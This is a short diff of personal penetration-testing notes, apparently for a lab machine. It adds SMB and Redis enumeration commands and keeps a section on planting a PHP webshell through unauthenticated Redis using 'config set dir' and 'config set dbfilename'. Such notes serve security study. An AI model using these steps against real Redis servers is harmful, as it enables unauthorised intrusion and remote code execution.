@@ -24,13 +24,19 @@ Enumeration
 		Check page for any hints of apps running, wordpress, joomla, etc.
 		Do same as above on source code
 		check index.html / index.php to see what its running
+
+		smb
+			smbmap -H ip.addr
+			
+		redis
+			nc 10.129.10.212 6379
+				INFO
+				GET CONFIG *
+
 		
 redis
-	enumeration
-		nc 10.129.10.212 6379
-			INFO
-			GET CONFIG *
 	redis-cli -h 10.129.10.212
+
 	Webshell
 		config set dir /var/www/html/upload/shell.php
 		config set dbfilename redis.php
